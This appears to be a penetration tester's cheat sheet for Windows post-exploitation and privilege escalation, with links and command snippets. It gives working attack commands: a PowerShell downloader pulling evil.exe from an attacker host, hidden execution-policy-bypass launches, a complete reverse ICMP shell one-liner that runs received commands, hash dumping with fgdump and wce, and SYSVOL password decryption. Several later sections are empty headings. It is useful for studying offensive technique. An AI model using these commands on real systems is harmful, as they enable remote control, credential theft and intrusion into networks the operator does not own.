# Post-Exploitation & Privilege Escalation

This is the phase I like to refer to as second pass enumeration or enumeration from the inside. Now that we've gained a foothold into the network it is crucial to run all of our enumeration from the ground up as an inside actor.

##### Resources

[http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)

[https://github.com/pentestmonkey/windows-privesc-check](https://github.com/pentestmonkey/windows-privesc-check)

[https://github.com/GDSSecurity/Windows-Exploit-Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester)

[https://foxglovesecurity.com/2016/01/16/hot-potato/](https://foxglovesecurity.com/2016/01/16/hot-potato/)

[http://hkashfi.blogspot.com/2008/04/bypassing-firewalls-with-port\_23.html](http://hkashfi.blogspot.com/2008/04/bypassing-firewalls-with-port_23.html)

[https://www.youtube.com/watch?v=kMG8IsCohHA](https://www.youtube.com/watch?v=kMG8IsCohHA)

[https://www.youtube.com/watch?v=PC\_iMqiuIRQ](https://www.youtube.com/watch?v=PC_iMqiuIRQ)

##### Cross Compiling from Kali

```
Kali> i586-mingw32msvc-gcc -o adduser.exe useradd.c
```

##### Transpile Python into EXE

```
Kali> python pyinstaller.py --onefile file.py
```

##### Uploading Files

```
Kali> cp /usr/share/windows-binaries/nc.exe
Kali> upx -9 nc.exe
Kali> wine exe2bat.exe nc.exe nc.txt
```

##### Powershell Foo

> ###### wget

```
echo $storageDir = $pwd > wget.ps1   
echo $webclient = New-Object System.Net.WebClient >> wget.ps1   
echo $url = "http://$ATTACKER/evil.exe" >> wget.ps1
echo $file = "new-exploit.exe" >> wget.ps1    
echo $webclient.DownloadFile($url,$file) >> wget.ps1

C:\> powershell.exe -ExecutionPolicy Bypass ‐NoLogo  ‐NonInteractive  ‐NoProfile ‐File wget.ps1
```

> ###### Execute ps1

```
C:\> powershell -exec bypass -windowstyle hidden -nop -file c:\path\to\file.ps1
```

> ###### Stream contents of file

```
C:\> Get-Item /path/to/file.zip -Stream *
```

> ###### Get permissions of directory/file

```
C:\> Get-ACL C:\path\to\file\or\directory
```

> ###### Packet testing

```
# TCP
# Setup TCP Listener ie: netcat
C:\> powershell -Command '$client = New-Object System.Net.Sockets.TcpClient;$client.Connect( "10.10.14.42", 8000 );[Byte[]] $packet = [Text.Encoding]::ASCII.GetBytes("pie")$client.Send($packet, $packet.Length);$client.Close();'

# UDP
# Setup UDP Listener ie: socat
C:\> powershell -Command '$client = New-Object System.Net.Sockets.UdpClient;$client.Connect( "10.10.14.42", 8000 );[Byte[]] $packet = [Text.Encoding]::ASCII.GetBytes("pie");$client.Send($packet, $packet.Length);$client.Close();'

# ICMP
Kali> sudo python icmpsh_m.py $ATTACKER $TARGET
C:\> powershell -Command '$client = New-Object System.Net.NetworkInformation.Ping;$options = New-Object System.Net.NetworkInformation.PingOptions;$options.DontFragment = $True;$packet = [Text.Encoding]::ASCII.GetBytes("pie");$client.Send("10.10.14.42", 500, $packet, $options);'
```

> ###### Reverse ICMP shell

```
Kali> sudo bash -c "echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all"
Kali> sudo python icmpsh_m.py $ATTACKER $TARGET

C:\> powershell -nop -Command "$IP = '10.10.14.42';$client = New-Object System.Net.NetworkInformation.Ping;$options = New-Object System.Net.NetworkInformation.PingOptions;$options.DontFragment = $true;$client.send($IP, 1000, ([Text.Encoding]::ASCII).GetBytes('pie'), $options);while($true){$comms = $client.Send($IP, 1000, ([Text.Encoding]::ASCII).GetBytes(''), $options);if($comms.Buffer){ $cmd = ([Text.Encoding]::ASCII).GetString($comms.Buffer);$reply = (Invoke-Expression -Command $cmd | Out-String);$client.send($IP, 1000, ([Text.Encoding]::ASCII).GetBytes($reply), $options);}}"
```

##### LDAP

[http://www.labofapenetrationtester.com/2017/08/week-of-evading-microsoft-ata-day1.html](http://www.labofapenetrationtester.com/2017/08/week-of-evading-microsoft-ata-day1.html)

##### Dump Hashes

```
C:\> fgdump.exe
C:\> type 127.0.0.1.pwdump
```

##### WCE

```
C:\> wce -w
```

##### PSExec

You need to be an admin already it copies an executable to an admin share and registers a service and starts it

[https://technet.microsoft.com/en-us/sysinternals/psexec.aspx](https://technet.microsoft.com/en-us/sysinternals/psexec.aspx)

[https://sourceforge.net/projects/winexe/](https://sourceforge.net/projects/winexe/)

[https://www.rapid7.com/db/modules/exploit/windows/smb/psexec\_psh](https://www.rapid7.com/db/modules/exploit/windows/smb/psexec_psh)

[http://www.powershellempire.com/?page\_id=523](http://www.powershellempire.com/?page_id=523)

##### UAC

##### [https://github.com/hfiref0x/UACME](https://github.com/hfiref0x/UACME)

##### WMIC

##### [https://github.com/CoreSecurity/impacket/blob/master/examples/wmiexec.py](https://github.com/CoreSecurity/impacket/blob/master/examples/wmiexec.py)

##### Insecure File Permissions

```
C:\> icacls example.exe
```

##### [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)

##### Insecure SYSVOL

```
C:\> net use z: \\dc01\SYSVOL
Z:\> dir /s Groups.xml
Z:\> copy
Kali> gpp-decrypt
```

##### Token Stealing

Once you have admin access on a computer, you can use the tokens of the other users to access resources in the domain.

##### Passing the Hash

##### 

##### Passing the Ticket

##### 

##### Process Injection

##### 

##### runas

##### 

##### Encapsulating SSH Traffic with httptunnel



